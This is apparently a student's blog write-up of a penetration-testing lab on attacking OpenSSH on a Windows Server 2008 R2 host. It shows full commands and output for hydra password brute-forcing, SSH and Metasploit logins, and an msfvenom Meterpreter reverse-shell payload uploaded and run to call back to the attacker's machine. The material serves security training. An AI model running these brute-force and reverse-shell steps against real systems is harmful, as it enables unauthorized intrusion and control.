---
layout: post
title: "Targeting OpenSSH"
date: "2023-05-03"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student v2
    - Host & Network Penetration Testing
    - Exploitation
---

# Windows Black Box Penetration Test（Windows 黑盒渗透测试）
## Targeting OpenSSH（针对 OpenSSH）
# Demo: Targeting OpenSSH（演示：针对 OpenSSH）
We're going to be taking a look at how to target the OpenSSH server or service that's running on the target system. So we'll be taking a look at the various tools and techniques that can be used to gain access to the target system via SSH. 

We're targeting OpenSSH.

`-sV`: perform a service version detection scan.

`-sC`: the default script scan.

```
nmap -sV -sC -p 22 10.0.26.161
```

In terms of targeting SSH, it doesn't matter what product or what service. It could be OpenSSH. It could be libssh, etc. What's important to consider is the operating system that it is running on. And in this case, we know it's running on a Windows system. So just keep that in mind in regards to the type of access that you will get once we obtain legitimate credentials.

Another thing to take into consideration is the fact that we were able to obtain legitimate credentials. In the context of services like FTP and SSH, they utilize user accounts on the Windows or Linux systems for authentication. The only thing that might change in certain cases is the password, but we were able to identify:

The administrator account on Windows, which is very important, and it is the most privileged account on a Windows system.

```
[21][ftp] host: 10.0.26.121   login: administrator   password: vagrant
[21][ftp] host: 10.0.26.121   login: vagrant   password: vagrant
```

We can perform a brute force attack on the SSH server. However, we also need to be efficient with that. And given the fact that we have identified two user accounts, then we can perform the brute force to identify whether the passwords are different for the SSH service for these two user accounts.

Before we do that, OpenSSH has a few vulnerabilities. However, most of them affect OpenSSH version 7.2.

```
searchsploit OpenSSH 7.1
```

```
hydra -l vagrant -P /usr/share/wordlists/metasploit/unix_users.txt 10.0.26.161 ssh
```

```
[22][ssh] host: 10.0.26.161   login: vagrant   password: vagrant
```

That means we can gain access to the target system via SSH as we have obtained legitimate credentials. However, given the fact that we're a penetration tester, we really want the prized asset, which is accessed via the administrator account that will then provide us with elevated privileges right out of the box.

We can perform a brute force for the user administrator.

```
hydra -l administrator -P /usr/share/wordlists/metasploit/unix_users.txt 10.0.26.161 ssh
```

We can log in with the user account vagrant. And this will provide us with initial access on the target system.

```
ssh vagrant@10.0.26.161

vagrant
```

This should provide us with a bash session or a Bourne shell session, which is slightly weird because we are working on a Windows system.

We get a Bourne shell session.

```
-sh-4.3$ ls -al
-sh-4.3$ pwd
-sh-4.3$ whoami
```

We probably cannot do that, and there might be a few compatibility issues there.

```
-sh-4.3$ net localgroup administrator
```

But the main thing is that we've obtained access to the target system.

If you type in any Windows native commands like `dir`, that will probably not work.

```
-sh-4.3$ dir
```

So we've got access to the target via SSH, which means we've pretty much owned this system at this point.

However, I also want to try and see whether we can gain access with the administrator account. 

```
ssh administrator@10.0.26.161

vagrant
```

Even though we were able to identify the password for the administrator account for FTP, and this is good security practice on the side of the administrator, is they've disabled SSH logins into the administrator account.

We can continue with access via the standard Bourne shell, or we can obtain a Meterpreter session with the already obtained credentials here.

I'll split this vertically here or just open up a new tab.

```
msfconsole
```

And we can use the SSH login module. And once we get a standard session or a standard reverse shell, we can upgrade that into a Meterpreter session.

```
search ssh_login
use 0
show options
set USERNAME vagrant
set PASSWORD vagrant
set RHOSTS 10.0.26.161
run
```

And it opens up an SSH session.

```
sessions
```

We get a standard shell.

```
sessions 1
```

Put this in the background using `Ctrl+z`.

And we still have the session active.

```
sessions
```

So I can upgrade this possibly to a Meterpreter session.

```
sessions -u 1
```

That makes sense because the shell that we have access to right now will not allow us to do that.

So another technique that we can utilize is the ability to generate a payload with msfvenom, a Meterpreter payload, and then transfer it over to the target system via SSH access.

```
sessions 1
```

And we can then download it to the target system. Execute it. And that will consequently provide us with a Meterpreter session. But that's not necessary at this step because we've already gained access to the target system.

If we try and log in again here,

```
ssh vagrant@10.0.26.161

vagrant
```

That will give us access to the target system. And we can navigate around the file system. Although, we are going to be limited in regards to what we can do because we are currently using the vagrant user. That is a non-privileged user account.

So that is how to gain access or how to target the OpenSSH service.

If you want to obtain a standard Windows command session or command shell, typical Windows CMD session, that can easily be done by saying `bash`.

That will open up your CMD, and you can now run Windows command.

```
-sh-4.3$ bash
```

Just to verify that this user is a part of the local administrators group, which means that at this point, 

```
C:\Users\vagrant>net localgroup administrators
```

```
C:\Users\vagrant>whoami /priv
```

We have the following privileges, but they are all disabled apart from a couple of them.

And in terms of elevating our privileges, we would typically need to bypass UAC or utilize another privilege escalation technique.

For now, the current user is unprivileged, but we're still been able to get access to the target system, and even though this to an unprivileged user at this point.

# Targeting OpenSSH
## Overview
Goal

The objective of this lab is to outline the various techniques that can be used to exploit a Windows system running OpenSSH.

## Tasks
Pre-requisites

1. Basic familiarity with Nmap.
2. Basic familiarity with the Metasploit Framework.

Requirements

This task does not have any requirements.

# 针对 OpenSSH
## 概述
目标

本实验的目的是概述可用于利用运行 OpenSSH 的 Windows 系统的各种技术。

## 任务
先决条件

1. 基本熟悉 Nmap。
2. 基本熟悉 Metasploit 框架。

要求

此任务没有任何要求。

# 复现视频内容
```
root@attackdefense:~# cat /etc/hosts
127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
10.1.0.3        attackdefense.com attackdefense
127.0.0.1 AttackDefense-Kali
10.10.21.2      attackdefense.com attackdefense
10.0.16.119    demo.ine.local
```

10.0.16.119    demo.ine.local

```
root@attackdefense:~# nmap -sV -sC -p 22 10.0.16.119
Starting Nmap 7.92 ( https://nmap.org ) at 2023-05-03 17:55 IST
Nmap scan report for demo.ine.local (10.0.16.119)
Host is up (0.0031s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.1 (protocol 2.0)
| ssh-hostkey: 
|   2048 83:56:2e:69:b5:2d:b4:9a:e4:7f:97:86:d8:bc:ae:7b (RSA)
|_  521 c0:e2:da:9d:e2:1e:58:09:7e:80:07:ec:3e:b4:57:f5 (ECDSA)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.25 seconds
```

```
root@attackdefense:~# searchsploit OpenSSH 7.1
---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
OpenSSH 2.3 < 7.7 - Username Enumeration                                                                                                                  | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                                                                                                            | linux/remote/45210.py
OpenSSH < 7.4 - 'UsePrivilegeSeparation Disabled' Forwarded Unix Domain Sockets Privilege Escalation                                                      | linux/local/40962.txt
OpenSSH < 7.4 - agent Protocol Arbitrary Library Loading                                                                                                  | linux/remote/40963.txt
OpenSSH < 7.7 - User Enumeration (2)                                                                                                                      | linux/remote/45939.py
---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

```
root@attackdefense:~# hydra -l vagrant -P /usr/share/wordlists/metasploit/unix_users.txt 10.0.16.119 ssh
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-05-03 18:01:27
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 168 login tries (l:1/p:168), ~11 tries per task
[DATA] attacking ssh://10.0.16.119:22/
[22][ssh] host: 10.0.16.119   login: vagrant   password: vagrant
```

```
[22][ssh] host: 10.0.16.119   login: vagrant   password: vagrant
```

```
root@attackdefense:~# hydra -l administrator -P /usr/share/wordlists/metasploit/unix_users.txt 10.0.16.119 ssh
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-05-03 18:04:31
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 168 login tries (l:1/p:168), ~11 tries per task
[DATA] attacking ssh://10.0.16.119:22/
[STATUS] 169.00 tries/min, 169 tries in 00:01h, 1 to do in 00:01h, 14 active
1 of 1 target completed, 0 valid password found
[WARNING] Writing restore file because 4 final worker threads did not complete until end.
[ERROR] 4 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-05-03 18:05:36
```

```
root@attackdefense:~# ssh vagrant@10.0.16.119
The authenticity of host '10.0.16.119 (10.0.16.119)' can't be established.
ECDSA key fingerprint is SHA256:/SMz+dLtiUg7jedCL6TkXQUoV/RrUsNi4SvWSjXW9bM.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.0.16.119' (ECDSA) to the list of known hosts.
vagrant@10.0.16.119's password: 
-sh-4.3$ pwd
/cygdrive/c/Users/vagrant
-sh-4.3$ whoami
vagrant-2008r2\vagrant
-sh-4.3$ net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
sshd_server
vagrant
The command completed successfully.
-sh-4.3$ systeminfo

Host Name:                 VAGRANT-2008R2
OS Name:                   Microsoft Windows Server 2008 R2 Standard 
OS Version:                6.1.7601 Service Pack 1 Build 7601
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          
Registered Organization:   Vagrant Inc.
Product ID:                00477-001-0000347-84909                                                                                                                                          
Original Install Date:     10/28/2021, 8:12:46 AM                                                                                                                                           
System Boot Time:          5/3/2023, 5:22:15 AM                                                                                                                                             
System Manufacturer:       Xen
System Model:              HVM domU
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 79 Stepping 1 GenuineIntel ~2300 Mhz
BIOS Version:              Xen 4.11.amazon, 8/24/2006
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     4,096 MB
Available Physical Memory: 2,405 MB
Virtual Memory: Max Size:  8,189 MB
Virtual Memory: Available: 5,765 MB
Virtual Memory: In Use:    2,424 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 2 Hotfix(s) Installed.
                           [01]: KB3134760
                           [02]: KB976902
Network Card(s):           1 NIC(s) Installed.
                           [01]: AWS PV Network Device
                                 Connection Name: Local Area Connection 2
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.0.16.1
                                 IP address(es)
                                 [01]: 10.0.16.119
                                 [02]: fe80::3c16:57ff:18d8:4925
-sh-4.3$ dir
-sh: dir: command not found
```

```
root@attackdefense:~# ssh administrator@10.0.16.119
administrator@10.0.16.119's password: 
Permission denied, please try again.
administrator@10.0.16.119's password: 
Permission denied, please try again.
administrator@10.0.16.119's password: 
administrator@10.0.16.119: Permission denied (publickey,password,keyboard-interactive).
```

```
root@attackdefense:~# msfconsole -q
msf6 > search ssh_login

Matching Modules
================

   #  Name                                    Disclosure Date  Rank    Check  Description
   -  ----                                    ---------------  ----    -----  -----------
   0  auxiliary/scanner/ssh/ssh_login                          normal  No     SSH Login Check Scanner
   1  auxiliary/scanner/ssh/ssh_login_pubkey                   normal  No     SSH Public Key Login Scanner


Interact with a module by name or index. For example info 1, use 1 or use auxiliary/scanner/ssh/ssh_login_pubkey

msf6 > use 0
```

```
msf6 auxiliary(scanner/ssh/ssh_login) > show options

Module options (auxiliary/scanner/ssh/ssh_login):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   BLANK_PASSWORDS   false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false            no        Add all passwords in the current database to the list
   DB_ALL_USERS      false            no        Add all users in the current database to the list
   DB_SKIP_EXISTING  none             no        Skip existing credentials stored in the current database (Accepted: none, user, user&realm)
   PASSWORD                           no        A specific password to authenticate with
   PASS_FILE                          no        File containing passwords, one per line
   RHOSTS                             yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT             22               yes       The target port
   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
   THREADS           1                yes       The number of concurrent threads (max one per host)
   USERNAME                           no        A specific username to authenticate as
   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false            no        Try the username as the password for all users
   USER_FILE                          no        File containing usernames, one per line
   VERBOSE           false            yes       Whether to print output for all attempts

msf6 auxiliary(scanner/ssh/ssh_login) > set USERNAME vagrant
USERNAME => vagrant
msf6 auxiliary(scanner/ssh/ssh_login) > set PASSWORD vagrant
PASSWORD => vagrant
msf6 auxiliary(scanner/ssh/ssh_login) > set RHOSTS 10.0.16.119
RHOSTS => 10.0.16.119
msf6 auxiliary(scanner/ssh/ssh_login) > run

[*] 10.0.16.119:22 - Starting bruteforce
[+] 10.0.16.119:22 - Success: 'vagrant:vagrant' 'Microsoft Windows Server 2008 R2 Standard 6.1.7601 Service Pack 1 Build 7601'
[*] SSH session 1 opened (10.10.21.2:37091 -> 10.0.16.119:22 ) at 2023-05-03 18:22:38 +0530
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

```
msf6 auxiliary(scanner/ssh/ssh_login) > sessions

Active sessions
===============

  Id  Name  Type           Information  Connection
  --  ----  ----           -----------  ----------
  1         shell windows  SSH root @   10.10.21.2:37091 -> 10.0.16.119:22  (10.0.16.119)

msf6 auxiliary(scanner/ssh/ssh_login) > sessions 1
[*] Starting interaction with 1...

pwd
/cygdrive/c/Users/vagrant
whoami
vagrant-2008r2\sshd_server
^Z
Background session 1? [y/N]  y
```

```
msf6 auxiliary(scanner/ssh/ssh_login) > sessions

Active sessions
===============

  Id  Name  Type           Information  Connection
  --  ----  ----           -----------  ----------
  1         shell windows  SSH root @   10.10.21.2:37091 -> 10.0.16.119:22  (10.0.16.119)

msf6 auxiliary(scanner/ssh/ssh_login) > sessions -u 1
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]

[*] Upgrading session ID: 1
[-] Target is running Windows on an unsupported architecture such as Windows ARM!
```

Kali Linux: 10.10.21.2

```
root@attackdefense:~# pwd
/root
root@attackdefense:~# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.21.2 LPORT=1234 -f exe > shell-x64.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
```

```
msf6 auxiliary(scanner/ssh/ssh_login) > sessions 1
[*] Starting interaction with 1...

OSArchitecture  
64-bit          

pwd
/cygdrive/c/Users/vagrant
upload /root/shell-x64.exe

Usage: upload [src] [dst]

Uploads load file to the victim machine.
This command does not support to upload a FOLDER yet

upload /root/shell-x64.exe /cygdrive/c/Users/vagrant/shell-x64.exe
[*] File </root/shell-x64.exe> size: 7168, need 28 times writes to upload
[*] Uploading (256/7168)
[*] Uploading (512/7168)
[*] Uploading (6912/7168)
[*] Uploading (7168/7168)
[+] File </cygdrive/c/Users/vagrant/shell-x64.exe> upload finished
ls       
shell-x64.exe
```

```
root@attackdefense:~# msfconsole -q
msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) > set LHOST 10.10.21.2
LHOST => 10.10.21.2
msf6 exploit(multi/handler) > set LPORT 1234
LPORT => 1234
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.21.2:1234
```

```
./shell-x64.exe
```

```
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.21.2:1234 
[*] Sending stage (200262 bytes) to 10.0.16.119                                                                                                                                             
[*] Meterpreter session 1 opened (10.10.21.2:1234 -> 10.0.16.119:50036 ) at 2023-05-03 18:38:37  +0530                                                                                       
meterpreter > sysinfo
Computer        : VAGRANT-2008R2
OS              : Windows 2008 R2 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 3
Meterpreter     : x64/windows
meterpreter > getuid
Server username: VAGRANT-2008R2\sshd_server
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeBackupPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeCreatePagefilePrivilege
SeCreateSymbolicLinkPrivilege
SeDebugPrivilege
SeImpersonatePrivilege
SeIncreaseBasePriorityPrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeLoadDriverPrivilege
SeManageVolumePrivilege
SeProfileSingleProcessPrivilege
SeRemoteShutdownPrivilege
SeRestorePrivilege
SeSecurityPrivilege
SeShutdownPrivilege
SeSystemEnvironmentPrivilege
SeSystemProfilePrivilege
SeSystemtimePrivilege
SeTakeOwnershipPrivilege
SeTimeZonePrivilege
SeUndockPrivilege
```

```
-sh-4.3$ whoami
vagrant-2008r2\vagrant
-sh-4.3$ bash
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\vagrant>net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
sshd_server
vagrant
The command completed successfully.


C:\Users\vagrant>whoami
vagrant-2008r2\vagrant

C:\Users\vagrant>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                  Description                               State   
=============================== ========================================= ========
SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Disabled
SeSecurityPrivilege             Manage auditing and security log          Disabled
SeTakeOwnershipPrivilege        Take ownership of files or other objects  Disabled
SeLoadDriverPrivilege           Load and unload device drivers            Disabled
SeSystemProfilePrivilege        Profile system performance                Disabled
SeSystemtimePrivilege           Change the system time                    Disabled
SeProfileSingleProcessPrivilege Profile single process                    Disabled
SeIncreaseBasePriorityPrivilege Increase scheduling priority              Disabled
SeCreatePagefilePrivilege       Create a pagefile                         Disabled
SeBackupPrivilege               Back up files and directories             Enabled 
SeRestorePrivilege              Restore files and directories             Enabled 
SeShutdownPrivilege             Shut down the system                      Disabled
SeDebugPrivilege                Debug programs                            Enabled 
SeSystemEnvironmentPrivilege    Modify firmware environment values        Disabled
SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled 
SeRemoteShutdownPrivilege       Force shutdown from a remote system       Disabled
SeUndockPrivilege               Remove computer from docking station      Disabled
SeManageVolumePrivilege         Perform volume maintenance tasks          Disabled
SeImpersonatePrivilege          Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege         Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege   Increase a process working set            Disabled
SeTimeZonePrivilege             Change the time zone                      Disabled
SeCreateSymbolicLinkPrivilege   Create symbolic links                     Disabled
```